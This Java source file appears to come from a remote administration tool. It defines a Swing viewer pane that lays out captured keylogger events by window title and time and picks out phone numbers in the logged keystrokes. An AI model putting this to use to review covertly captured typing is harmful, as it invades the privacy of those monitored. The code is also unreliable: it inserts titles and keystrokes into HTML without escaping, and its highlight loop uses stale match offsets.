/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.ui.screen.controls.client;

import java.util.ArrayList;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.JTextPane;

import com.subterranean_security.crimson.sv.keylogger.Event;
import com.subterranean_security.crimson.sv.keylogger.Page;

public class KeyLogPane extends JTextPane {

	private static final long serialVersionUID = 1L;
	private boolean highlightPhone = true;
	private boolean highlightEmail = true;
	private boolean highlightURL = false;
	private boolean highlightFileURL = false;

	public boolean isHighlightPhone() {
		return highlightPhone;
	}

	public void setHighlightPhone(boolean highlightPhone) {
		this.highlightPhone = highlightPhone;
	}

	public boolean isHighlightEmail() {
		return highlightEmail;
	}

	public void setHighlightEmail(boolean highlightEmail) {
		this.highlightEmail = highlightEmail;
	}

	public boolean isHighlightURL() {
		return highlightURL;
	}

	public void setHighlightURL(boolean highlightURL) {
		this.highlightURL = highlightURL;
	}

	public boolean isHighlightFileURL() {
		return highlightFileURL;
	}

	public void setHighlightFileURL(boolean highlightFileURL) {
		this.highlightFileURL = highlightFileURL;
	}

	public KeyLogPane() {
		setEditable(false);
		setVisible(true);
		this.setContentType("text/html");
	}

	public void loadData(Page page) {

		ArrayList<String> lines = new ArrayList<String>();

		String lastTitle = null;

		for (Event k : page.events) {
			String title = page.titles.get(k.titleOffset);
			Date date = new Date(page.ref.getTime() + k.timeOffset);
			if (lastTitle != null && lastTitle.equals(title)) {

				// old window
				lines.set(lines.size() - 1, lines.get(lines.size() - 1) + k.event);

			} else {

				// new window
				lines.add("<br><strong><font color=\"#c80000\">\"" + title + "\" at " + date.toString()
						+ "</font></strong>");
				lines.add(k.event);
				lastTitle = title;

			}

		}

		StringBuffer text = new StringBuffer();
		for (String s : lines) {
			text.append(highlight(s) + "<br>");
		}
		setText(text.toString());
	}

	public void clear() {
		setText("");
	}

	private String highlight(String s) {

		if (highlightEmail) {

		}
		if (highlightFileURL) {

		}
		if (highlightPhone) {
			Matcher phone = Pattern.compile("\\d{3}-\\d{3}[-]\\d{4}").matcher(s);
			while (phone.find()) {
				int start = phone.start();
				int end = phone.end();
				String target = s.substring(start, end);
				s = s.substring(0, start) + "<font color=\"#c80000\">" + target + "</font>" + s.substring(end);
			}
		}
		if (highlightURL) {

		}
		return s;
	}

}
